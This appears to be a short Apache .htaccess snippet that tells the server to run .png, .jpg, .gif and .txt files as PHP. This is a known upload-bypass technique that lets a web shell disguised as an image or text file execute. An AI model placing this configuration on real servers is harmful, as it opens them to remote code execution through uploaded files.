AddType application/x-httpd-php .png
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .txt
